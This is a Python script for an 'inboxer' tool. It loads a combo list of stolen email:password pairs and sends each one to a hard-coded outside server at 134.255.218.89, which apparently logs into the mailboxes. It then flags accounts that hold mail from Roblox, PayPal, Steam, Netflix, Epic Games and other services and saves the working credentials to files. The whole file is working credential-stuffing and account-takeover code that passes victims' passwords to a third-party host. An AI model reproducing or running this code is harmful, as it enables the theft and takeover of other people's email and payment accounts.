import requests
import os
import json
from datetime import datetime
from colorama import Fore, Style

INBOXER_BANNER = """
\033[38;5;93m██████╗ ██╗   ██╗███████╗██╗  ██╗
\033[38;5;99m██╔══██╗██║   ██║██╔════╝██║  ██║
\033[38;5;105m██████╔╝██║   ██║███████╗███████║
\033[38;5;161m██╔══██╗██║   ██║╚════██║██╔══██║
\033[38;5;162m██║  ██║╚██████╔╝███████║██║  ██║
\033[38;5;196m╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
\033[38;5;51m██╗  ██╗███╗   ███╗    ██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
\033[38;5;45m██║  ██║████╗ ████║    ██║████╗  ██║██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝██╔══██╗
\033[38;5;39m███████║██╔████╔██║    ██║██╔██╗ ██║██████╔╝██║   ██║ ╚███╔╝ █████╗  ██████╔╝
\033[38;5;33m██╔══██║██║╚██╔╝██║    ██║██║╚██╗██║██╔══██╗██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗
\033[38;5;27m██║  ██║██║ ╚═╝ ██║    ██║██║ ╚████║██████╔╝╚██████╔╝██╔╝ ██╗███████╗██║  ██║
\033[38;5;21m╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\033[0m"""

class RushInboxer:
    def __init__(self):
        self.counters = {
            'roblox': 0, 'nintendo': 0, 'ubisoft': 0, 'epic': 0,
            'steam': 0, 'xbox': 0, 'crunchyroll': 0, 'paypal': 0,
            'paysafecard': 0, 'disney': 0, 'netflix': 0, 'valorant': 0,
            'ea': 0, 'origin': 0
        }
        self.services = {
            'roblox': ['@roblox.com'],
            'nintendo': ['@nintendo.com'],
            'ubisoft': ['@ubisoft.com'],
            'epic': ['@epicgames.com'],
            'steam': ['@steampowered.com'],
            'xbox': ['@xbox.com'],
            'crunchyroll': ['@crunchyroll.com'],
            'paypal': ['@paypal.com'],
            'paysafecard': ['@paysafecard.com'],
            'disney': ['@disney.com', '@disneyplus.com'],
            'netflix': ['@netflix.com'],
            'valorant': ['@riotgames.com'],
            'ea': ['@ea.com'],
            'origin': ['@origin.com']
        }
        self.setup_directories()

    def setup_directories(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results_dir = f"inboxer_results_{timestamp}"
        os.makedirs(self.results_dir, exist_ok=True)
        for service in self.services.keys():
            open(os.path.join(self.results_dir, f"{service}.txt"), 'w').close()

    def clark(self, email, password):
        json_data = {
            "email": email,
            "pass": password
        }
        return requests.post("http://134.255.218.89:6969/check", json=json_data)

    def process_emails(self, email, password, response, selected_services):
        try:
            email_data = json.loads(response.text)
            found_services = []
            
            for service, domains in selected_services.items():
                count = 0
                for email_entry in email_data:
                    sender = email_entry.get('from', '').lower()
                    for domain in domains:
                        if domain.lower() in sender:
                            count += 1
                
                if count > 0:
                    self.counters[service] += count
                    self.save_hit(service, email, password, count)
                    found_services.append(f"{service.upper()}:{count}")
            
            if found_services:
                services_str = " | ".join(found_services)
                print(f"{Fore.GREEN}[HIT] {email}:{password} | SERVICES: {services_str}{Style.RESET_ALL}")
                
        except json.JSONDecodeError:
            print(f"{Fore.RED}[ERROR] Invalid API response format{Style.RESET_ALL}")

    def save_hit(self, service, email, password, count):
        with open(os.path.join(self.results_dir, f"{service}.txt"), 'a') as f:
            f.write(f"{email}:{password} | Emails found: {count}\n")

    def start(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(INBOXER_BANNER)

        print(f"\n{Fore.CYAN}Select services to check:")
        print("1. All services")
        print("2. Select specific services")
        
        choice = input(f"\n{Fore.YELLOW}Choose an option: {Style.RESET_ALL}")
        
        selected_services = {}
        if choice == "2":
            for idx, service in enumerate(self.services.keys(), 1):
                print(f"{idx}. {service.upper()}")
            
            selections = input(f"\n{Fore.YELLOW}Enter service numbers (comma-separated): {Style.RESET_ALL}")
            for num in selections.split(','):
                try:
                    idx = int(num.strip()) - 1
                    service_name = list(self.services.keys())[idx]
                    selected_services[service_name] = self.services[service_name]
                except (ValueError, IndexError):
                    continue
        else:
            selected_services = self.services

        combo_file = input(f"{Fore.CYAN}Enter combo file path: {Style.RESET_ALL}")
        
        try:
            with open(combo_file, 'r') as f:
                combos = [line.strip() for line in f if ':' in line]

            print(f"\n{Fore.CYAN}[+] Loaded {len(combos)} combos{Style.RESET_ALL}")
            
            for combo in combos:
                email, password = combo.split(':')
                response = self.clark(email, password)
                
                if "success" in response.text.lower():
                    self.process_emails(email, password, response, selected_services)
                else:
                    print(f"{Fore.RED}[FAIL] {email}:{password}{Style.RESET_ALL}")

            self.print_results()
            
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] Combo file not found!{Style.RESET_ALL}")

        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

    def print_results(self):
        print(f"\n{Fore.CYAN}═══ Final Results ═══{Style.RESET_ALL}")
        for service, count in self.counters.items():
            if count > 0:
                print(f"{Fore.GREEN}{service.upper()}: {count} emails found{Style.RESET_ALL}")
